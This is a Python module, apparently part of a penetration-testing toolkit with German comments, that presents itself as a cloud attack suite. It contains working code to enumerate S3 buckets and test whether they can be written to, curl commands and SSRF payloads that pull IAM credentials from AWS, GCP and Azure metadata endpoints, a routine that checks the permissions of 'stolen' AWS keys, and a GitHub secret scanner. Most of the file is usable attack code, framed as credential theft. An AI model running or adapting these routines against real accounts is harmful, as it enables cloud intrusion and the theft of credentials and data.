"""
AWS / Cloud Reconnaissance & Attack Suite.

Angriffe auf falsch konfigurierte Cloud-Infrastruktur:
  - S3 Bucket Enumeration (öffentliche Buckets)
  - AWS Metadata Endpoint (169.254.169.254) — EC2 Credentials stehlen
  - IAM Credential Bruteforce + Privilege Check
  - AWS CLI Misconfiguration Check
  - Azure / GCP equivalent attacks

Voraussetzungen:
  pip3 install boto3 awscli
  apt install awscli
"""

from __future__ import annotations
import asyncio
import os
import shutil
import urllib.request
import json
from typing import AsyncGenerator

from core.runner import CommandRunner

runner = CommandRunner()


# ── S3 Bucket Enumeration ─────────────────────────────────────────────────────

S3_PERMUTATIONS = [
    "{name}", "{name}-backup", "{name}-dev", "{name}-prod", "{name}-staging",
    "{name}-files", "{name}-assets", "{name}-static", "{name}-media",
    "{name}-data", "{name}-uploads", "{name}-logs", "{name}-archive",
    "{name}.com", "{name}-bucket", "backup-{name}", "dev-{name}",
]

async def enumerate_s3_buckets(company: str, region: str = "us-east-1") -> AsyncGenerator[str, None]:
    """
    Testet häufige S3-Bucket-Namen für ein Unternehmen auf öffentlichen Zugriff.
    """
    yield f"\033[1;36m[*] S3 Bucket Enumeration — {company}\033[0m"
    yield f"\033[90m    Region: {region} | {len(S3_PERMUTATIONS)} Varianten werden getestet\033[0m\n"

    found: list[str] = []

    for tmpl in S3_PERMUTATIONS:
        bucket = tmpl.format(name=company.lower().replace(" ", "-"))
        url    = f"https://{bucket}.s3.{region}.amazonaws.com/"

        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                code = resp.status
                body = resp.read(512).decode(errors="replace")

                if "<ListBucketResult" in body:
                    yield f"\033[31m[!!!] ÖFFENTLICH LESBAR: {url}\033[0m"
                    yield f"\033[31m      → Bucket-Inhalt: aws s3 ls s3://{bucket} --no-sign-request\033[0m"
                    found.append(bucket)
                elif code == 200:
                    yield f"\033[33m[+]  Existiert (200): {bucket}\033[0m"
                    found.append(bucket)

        except urllib.error.HTTPError as e:
            if e.code == 403:
                yield f"\033[33m[~]  Existiert (403 Forbidden): {bucket}\033[0m"
                found.append(bucket)
            # 404 / NoSuchBucket = existiert nicht → still
        except Exception:
            pass

    yield ""
    if found:
        yield f"\033[32m[✓] {len(found)} Buckets gefunden:\033[0m"
        for b in found:
            yield f"\033[36m    aws s3 ls s3://{b} --no-sign-request\033[0m"
            yield f"\033[36m    aws s3 sync s3://{b} ./{b}/ --no-sign-request\033[0m"
    else:
        yield "\033[90m  Keine öffentlichen Buckets gefunden\033[0m"


async def check_s3_public_acl(bucket: str) -> AsyncGenerator[str, None]:
    """Prüft ob ein bekannter Bucket schreibbar ist (PUT-Test)."""
    yield f"\033[1;36m[*] S3 ACL Check — {bucket}\033[0m\n"

    if shutil.which("aws"):
        yield "\033[36m  [*] Listing...\033[0m"
        async for line in runner.run(["aws", "s3", "ls", f"s3://{bucket}", "--no-sign-request"]):
            yield f"\033[32m  {line}\033[0m"

        yield "\033[36m  [*] Write-Test (harmloser Testfile)...\033[0m"
        test_content = b"penkit_write_test"
        import tempfile
        with tempfile.NamedTemporaryFile(suffix=".txt", delete=False) as tmp:
            tmp.write(test_content)
            tmp_path = tmp.name

        async for line in runner.run([
            "aws", "s3", "cp", tmp_path,
            f"s3://{bucket}/penkit_test.txt", "--no-sign-request",
        ]):
            if "upload" in line.lower():
                yield f"\033[31m[!!!] SCHREIBZUGRIFF! Bucket ist öffentlich beschreibbar!\033[0m"
                yield f"\033[31m      → Malware-Upload, Webshell, Phishing-Pages möglich\033[0m"
        os.unlink(tmp_path)
    else:
        yield "\033[33m  [!] awscli nicht installiert: apt install awscli\033[0m"


# ── AWS Metadata Endpoint (SSRF / EC2) ───────────────────────────────────────

async def steal_ec2_credentials(target_url: str = "") -> AsyncGenerator[str, None]:
    """
    AWS Instance Metadata Service (IMDS) — stiehlt temporäre IAM-Credentials.

    Angriffswege:
      1. Direkter Zugriff (du bist auf EC2-Instanz via Shell)
      2. SSRF in Web-App (Web-App macht Request zu 169.254.169.254)
    """
    yield "\033[1;36m[*] AWS Metadata Endpoint — Credential Theft\033[0m\n"

    IMDS_BASE = "http://169.254.169.254/latest"

    yield "\033[33m[Methode 1 — Direkt (auf EC2-Instanz)]\033[0m"
    yield "\033[36m  # IAM Role Name herausfinden:\033[0m"
    yield f"\033[36m  curl {IMDS_BASE}/meta-data/iam/security-credentials/\033[0m"
    yield ""
    yield "\033[36m  # Temporäre Credentials holen (ROLE_NAME einsetzen):\033[0m"
    yield f"\033[36m  curl {IMDS_BASE}/meta-data/iam/security-credentials/ROLE_NAME\033[0m"
    yield ""
    yield "\033[36m  # Response enthält:\033[0m"
    yield "\033[36m  #   AccessKeyId, SecretAccessKey, Token (gültig ~6h)\033[0m\n"

    yield "\033[36m  # Direkt als AWS CLI nutzen:\033[0m"
    yield "\033[36m  export AWS_ACCESS_KEY_ID=ASIA...\033[0m"
    yield "\033[36m  export AWS_SECRET_ACCESS_KEY=...\033[0m"
    yield "\033[36m  export AWS_SESSION_TOKEN=...\033[0m"
    yield "\033[36m  aws sts get-caller-identity  # wer bin ich?\033[0m\n"

    yield "\033[33m[Methode 2 — SSRF in Webanwendung]\033[0m"
    yield "\033[36m  # Parameter der Webanwendung testet auf SSRF:\033[0m"
    yield f"\033[36m  curl 'https://target.com/fetch?url={IMDS_BASE}/meta-data/iam/security-credentials/'\033[0m"
    yield ""
    yield "\033[36m  # IMDSv2 (neuere EC2) — braucht Token:\033[0m"
    yield "\033[36m  TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' \\\\\033[0m"
    yield "\033[36m    -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\033[0m"
    yield f"\033[36m  curl -H \"X-aws-ec2-metadata-token: $TOKEN\" {IMDS_BASE}/meta-data/iam/security-credentials/\033[0m\n"

    yield "\033[33m[Methode 3 — Andere Cloud Metadata]\033[0m"
    yield "\033[36m  # GCP:\033[0m"
    yield "\033[36m  curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \\\\\033[0m"
    yield "\033[36m    -H 'Metadata-Flavor: Google'\033[0m"
    yield ""
    yield "\033[36m  # Azure:\033[0m"
    yield "\033[36m  curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-11-01&resource=https://management.azure.com/' \\\\\033[0m"
    yield "\033[36m    -H 'Metadata: true'\033[0m"

    if target_url:
        yield f"\n\033[33m[*] Teste SSRF auf {target_url}...\033[0m"
        ssrf_payloads = [
            f"{IMDS_BASE}/meta-data/",
            f"{IMDS_BASE}/meta-data/iam/security-credentials/",
            "http://169.254.169.254/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]
        for payload in ssrf_payloads:
            yield f"\033[36m  Payload: {payload}\033[0m"
            yield f"\033[36m  → {target_url}?url={payload}\033[0m"


# ── AWS Credential Check ──────────────────────────────────────────────────────

async def check_aws_credentials(
    access_key: str,
    secret_key: str,
    session_token: str = "",
) -> AsyncGenerator[str, None]:
    """Validiert gestohlene AWS-Credentials und prüft Berechtigungen."""
    yield "\033[1;36m[*] AWS Credential Validator\033[0m\n"

    env = os.environ.copy()
    env["AWS_ACCESS_KEY_ID"]     = access_key
    env["AWS_SECRET_ACCESS_KEY"] = secret_key
    if session_token:
        env["AWS_SESSION_TOKEN"] = session_token

    if not shutil.which("aws"):
        yield "\033[33m[!] awscli nicht installiert: apt install awscli\033[0m"
        return

    yield "\033[36m  [*] Identität prüfen...\033[0m"
    async for line in runner.run(["aws", "sts", "get-caller-identity", "--output", "json"], env=env):
        if line.strip():
            yield f"\033[32m  {line.strip()}\033[0m"

    yield "\n\033[36m  [*] S3 Buckets auflisten...\033[0m"
    async for line in runner.run(["aws", "s3", "ls", "--output", "json"], env=env):
        if line.strip():
            yield f"\033[36m  {line.strip()}\033[0m"

    yield "\n\033[36m  [*] IAM-Berechtigungen prüfen...\033[0m"
    priv_checks = [
        ["aws", "iam", "list-users"],
        ["aws", "iam", "list-roles"],
        ["aws", "ec2", "describe-instances"],
        ["aws", "lambda", "list-functions"],
        ["aws", "secretsmanager", "list-secrets"],
    ]
    for cmd in priv_checks:
        service = cmd[1]
        async for line in runner.run(cmd + ["--output", "json"], env=env):
            if '"' in line:
                yield f"\033[32m  [✓] {service}: Zugriff!\033[0m"
                break
        else:
            yield f"\033[90m  [-] {service}: Kein Zugriff\033[0m"


# ── GitHub Secret Scanning ────────────────────────────────────────────────────

async def github_secret_scan(github_user_or_repo: str) -> AsyncGenerator[str, None]:
    """
    Sucht versehentlich committe Secrets in GitHub-Repos.
    Nutzt truffleHog oder git-secrets.
    """
    yield f"\033[1;36m[*] GitHub Secret Scan — {github_user_or_repo}\033[0m\n"

    yield "\033[33m[Methode 1 — truffleHog (empfohlen)]\033[0m"
    yield "\033[36m  pip3 install trufflehog\033[0m"
    yield f"\033[36m  trufflehog github --repo https://github.com/{github_user_or_repo}\033[0m"
    yield "\033[36m  # Findet: AWS Keys, API Tokens, Passwörter, Private Keys\033[0m\n"

    yield "\033[33m[Methode 2 — gitleaks]\033[0m"
    yield "\033[36m  apt install gitleaks\033[0m"
    yield f"\033[36m  gitleaks detect --source . --report-format json\033[0m\n"

    yield "\033[33m[Methode 3 — GitHub API — alle Repos eines Users]\033[0m"
    yield "\033[36m  import urllib.request, json\033[0m"
    api_url = f"https://api.github.com/users/{github_user_or_repo}/repos?per_page=100"
    try:
        req = urllib.request.Request(api_url, headers={"User-Agent": "PenKit"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            repos = json.loads(resp.read())
        yield f"\033[32m  [+] {len(repos)} Repos gefunden:\033[0m"
        for repo in repos[:10]:
            yield f"\033[36m    trufflehog github --repo {repo['clone_url']}\033[0m"
        if len(repos) > 10:
            yield f"\033[90m    ... und {len(repos)-10} weitere\033[0m"
    except Exception as e:
        yield f"\033[33m  [!] GitHub API: {e}\033[0m"

    yield ""
    yield "\033[33m[Was oft gefunden wird]\033[0m"
    yield "\033[36m  - AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY\033[0m"
    yield "\033[36m  - GITHUB_TOKEN / GITLAB_TOKEN\033[0m"
    yield "\033[36m  - DATABASE_URL (mit Passwort)\033[0m"
    yield "\033[36m  - .env Dateien (versehentlich committed)\033[0m"
    yield "\033[36m  - Private SSH/TLS Keys\033[0m"
    yield "\033[36m  - Stripe / Twilio / SendGrid API Keys\033[0m"


# ── Übersicht ─────────────────────────────────────────────────────────────────

async def show_cloud_overview() -> AsyncGenerator[str, None]:
    yield "\033[1;36m╔══════════════════════════════════════════════════╗\033[0m"
    yield "\033[1;36m║           Cloud Attack Suite — Übersicht         ║\033[0m"
    yield "\033[1;36m╚══════════════════════════════════════════════════╝\033[0m"
    yield ""
    yield "  \033[33m[1]\033[0m S3 Bucket Enumeration     — öffentliche Buckets finden + lesen"
    yield "  \033[33m[2]\033[0m AWS Metadata Theft        — EC2 IAM-Credentials via SSRF/Shell"
    yield "  \033[33m[3]\033[0m AWS Credential Validator  — gestohlene Keys auf Rechte prüfen"
    yield "  \033[33m[4]\033[0m GitHub Secret Scan        — truffleHog, gitleaks, API-Keys"
    yield ""
